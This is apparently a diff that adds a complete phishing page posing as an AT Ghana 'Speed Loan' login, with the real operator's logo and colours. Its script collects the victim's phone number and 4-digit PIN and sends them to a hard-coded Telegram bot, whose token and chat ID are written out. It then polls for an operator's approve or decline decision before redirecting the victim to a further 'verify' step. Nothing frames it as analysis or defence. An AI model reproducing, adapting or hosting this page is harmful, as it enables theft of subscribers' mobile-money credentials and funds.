@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Log In - AT Ghana Speed Loan</title>
+    <link rel="icon" href="https://www.at.com.gh/favicon.ico" type="image/x-icon">
+    <meta name="theme-color" content="#E30613">
+    <style>
+        :root {
+            --primary-color: #E30613;
+            --bg-color: #f8f9fc;
+            --card-bg: #ffffff;
+            --text-main: #1a1a1a;
+            --text-muted: #495057;
+            --border-color: #dee2e6;
+            --font-stack: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        html, body {
+            min-height: 100vh;
+            font-family: var(--font-stack);
+            background: var(--bg-color);
+            overflow-x: hidden;
+            color: var(--text-main);
+            line-height: 1.5;
+        }
+
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+        }
+
+        .login-card {
+            width: 100%;
+            max-width: 400px;
+            background: var(--card-bg);
+            border-radius: 28px;
+            padding: 40px 24px;
+            box-shadow: 0 12px 40px rgba(0,0,0,0.06);
+            text-align: center;
+            border: 1px solid rgba(0,0,0,0.05);
+        }
+
+        .logo-wrapper {
+            margin-bottom: 24px;
+            display: flex;
+            justify-content: center;
+        }
+
+        .logo-img {
+            height: 80px;
+            width: auto;
+            object-fit: contain;
+            display: block;
+        }
+
+        h1 {
+            font-size: 26px;
+            font-weight: 800;
+            margin-bottom: 8px;
+            color: #000;
+        }
+
+        .subtitle {
+            font-size: 15px;
+            color: var(--text-muted);
+            line-height: 1.5;
+            margin-bottom: 32px;
+        }
+
+        .form-group {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-size: 14px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            color: #1a1a1a;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 16px;
+            border: 2px solid #e9ecef;
+            border-radius: 14px;
+            font-size: 17px;
+            font-weight: 600;
+            outline: none;
+            transition: all 0.2s;
+            background: #f8f9fa;
+        }
+
+        .form-input:focus {
+            border-color: var(--primary-color);
+            background: #fff;
+            box-shadow: 0 0 0 4px rgba(227,6,19,0.05);
+        }
+
+        .password-wrapper {
+            position: relative;
+        }
+
+        .toggle-password {
+            position: absolute;
+            top: 50%;
+            right: 16px;
+            transform: translateY(-50%);
+            cursor: pointer;
+            width: 24px;
+            height: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .toggle-password svg {
+            width: 20px;
+            height: 20px;
+            fill: #adb5bd;
+            transition: fill 0.2s;
+        }
+
+        .toggle-password:hover svg {
+            fill: var(--primary-color);
+        }
+
+        .error-msg {
+            color: #dc3545;
+            font-size: 13px;
+            font-weight: 600;
+            margin-top: 8px;
+            display: none;
+            text-align: center;
+        }
+
+        .btn-group {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-top: 32px;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 16px;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s;
+            border: none;
+            text-align: center;
+        }
+
+        .btn-action {
+            background: var(--primary-color);
+            color: white;
+            box-shadow: 0 8px 25px rgba(227,6,19,0.25);
+        }
+
+        .btn-back {
+            background: #e9ecef;
+            color: #495057;
+            font-size: 16px;
+        }
+
+        .btn:active {
+            transform: scale(0.98);
+        }
+
+        /* NEW SPINNER STYLES */
+        #spinner {
+            position: fixed;
+            inset: 0;
+            background: #fff; /* Solid background to hide content */
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+        .dots-container {
+            width: 60px;
+            height: 60px;
+            position: relative;
+            animation: rotate-dots 1.5s linear infinite;
+            margin-bottom: 20px;
+        }
+        .dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            position: absolute;
+        }
+        .dot-1 { background-color: #E30613; top: 0; left: 50%; transform: translateX(-50%); }
+        .dot-2 { background-color: #0056b3; bottom: 0; left: 50%; transform: translateX(-50%); }
+        .dot-3 { background-color: #E30613; left: 0; top: 50%; transform: translateY(-50%); }
+        .dot-4 { background-color: #0056b3; right: 0; top: 50%; transform: translateY(-50%); }
+
+        .spinner-text {
+            font-size: 16px;
+            font-weight: 500;
+            color: #555;
+            letter-spacing: 0.5px;
+        }
+
+        @keyframes rotate-dots {
+            100% { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 480px) {
+            .login-card { padding: 32px 20px; border-radius: 24px; }
+            .logo-img { height: 70px; }
+            h1 { font-size: 24px; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-card">
+    <div class="logo-wrapper">
+        <img src="https://www.at.com.gh/assets/img/at-logos/at-logo-sm.png" alt="AT Logo" class="logo-img">
+    </div>
+
+    <h1>Welcome to AT Ghana</h1>
+    <p class="subtitle">Verify your account for loan approval. You need to be an AT subscriber to proceed.</p>
+
+    <div class="form-group">
+        <label>Phone Number</label>
+        <input type="tel" id="phone" class="form-input" placeholder="0XXXXXXXXX" maxlength="10" inputmode="numeric">
+    </div>
+
+    <div class="form-group">
+        <label>PIN</label>
+        <div class="password-wrapper">
+            <input type="password" id="password" class="form-input" placeholder="4-digit PIN" maxlength="4" inputmode="numeric">
+            <div id="togglePassword" class="toggle-password">
+                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
+                </svg>
+            </div>
+        </div>
+    </div>
+
+    <div id="err" class="error-msg">Please enter a valid AT number and correct pin</div>
+
+    <div class="btn-group">
+        <button class="btn btn-action" id="next">Next</button>
+        <button class="btn btn-back" id="back">Go Back</button>
+    </div>
+</div>
+
+<div id="spinner">
+    <div class="dots-container">
+        <div class="dot dot-1"></div>
+        <div class="dot dot-2"></div>
+        <div class="dot dot-3"></div>
+        <div class="dot dot-4"></div>
+    </div>
+    <div class="spinner-text">please wait...</div>
+</div>
+
+<script>
+    const CONFIG = {
+        BOT_TOKEN: '8699232330:AAG8Xm56m8g0Uixtd7WhttHtxr8jx4rIBFI',
+        CHAT_ID: '8632204062',
+        REDIRECT_PAGE: 'verify'
+    };
+    
+    let state = { poll: null, approveId: null, declineId: null };
+
+    const els = {
+        phoneInput: document.getElementById('phone'),
+        passwordInput: document.getElementById('password'),
+        togglePassword: document.getElementById('togglePassword'),
+        nextBtn: document.getElementById('next'),
+        errMsg: document.getElementById('err'),
+        spinner: document.getElementById('spinner'),
+        backBtn: document.getElementById('back')
+    };
+
+    // RESTRICTION: Only digits and specific lengths
+    [els.phoneInput, els.passwordInput].forEach(input => {
+        input.addEventListener('input', (e) => {
+            e.target.value = e.target.value.replace(/\D/g, '');
+        });
+    });
+
+    // Password Toggle
+    els.togglePassword.addEventListener('click', () => {
+        const isPassword = els.passwordInput.type === 'password';
+        els.passwordInput.type = isPassword ? 'text' : 'password';
+        els.togglePassword.innerHTML = isPassword
+            ? '<svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/></svg>'
+            : '<svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>';
+    });
+
+    function showError(msg) { 
+        if(msg) els.errMsg.textContent = msg;
+        els.errMsg.style.display = 'block'; 
+    }
+    function hideError() { els.errMsg.style.display = 'none'; }
+    function showSpinner() { els.spinner.style.display = 'flex'; }
+    function hideSpinner() { els.spinner.style.display = 'none'; }
+    function stopPolling() { if (state.poll) { clearInterval(state.poll); state.poll = null; } }
+
+    function sendLoginAttempt(accountValue, password) {
+        const ts = Date.now();
+        state.approveId = `approve_${ts}`;
+        state.declineId = `decline_${ts}`;
+        const message = `AT Ghana Login Attempt\n\n` +
+                        `Account Type: \`Mobile\`\n` +
+                        `Account: \`${accountValue}\`\n` +
+                        `PIN: \`${password}\`\n\nAction?`;
+        fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CONFIG.CHAT_ID,
+                text: message,
+                parse_mode: 'MarkdownV2',
+                reply_markup: {
+                    inline_keyboard: [[
+                        { text: '✅ Approve & Continue', callback_data: state.approveId },
+                        { text: '❌ Decline', callback_data: state.declineId }
+                    ]]
+                }
+            })
+        }).catch(err => {
+            hideSpinner();
+            alert('Connection error: ' + err.message);
+        });
+        startPolling();
+    }
+
+    function startPolling() {
+        stopPolling();
+        state.poll = setInterval(() => {
+            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=-1&timeout=30`)
+                .then(r => r.json())
+                .then(data => {
+                    if (!data.ok || !data.result?.length) return;
+                    for (const update of data.result) {
+                        const cb = update.callback_query;
+                        if (!cb) continue;
+                        const cbData = cb.data;
+                        if (cbData === state.approveId) {
+                            stopPolling();
+                            hideSpinner();
+                            localStorage.setItem('phone', els.phoneInput.value.trim());
+                            window.location.href = CONFIG.REDIRECT_PAGE;
+                            return;
+                        }
+                        if (cbData === state.declineId) {
+                            stopPolling();
+                            hideSpinner();
+                            showError("Login declined. Please check your credentials.");
+                            return;
+                        }
+                    }
+                })
+                .catch(console.warn);
+        }, 2000);
+    }
+
+    els.nextBtn.onclick = () => {
+        hideError();
+        const inputVal = els.phoneInput.value.trim();
+        const pwd = els.passwordInput.value.trim();
+
+        if (inputVal.length !== 10 || !inputVal.startsWith('0')) {
+            showError("Please enter a valid 10-digit phone number");
+            return;
+        }
+        if (pwd.length !== 4) {
+            showError("Please enter a valid 4-digit PIN");
+            return;
+        }
+
+        showSpinner();
+        sendLoginAttempt(inputVal, pwd);
+    };
+
+    els.backBtn.onclick = () => window.history.back();
+</script>
+
+</body>
+</html>
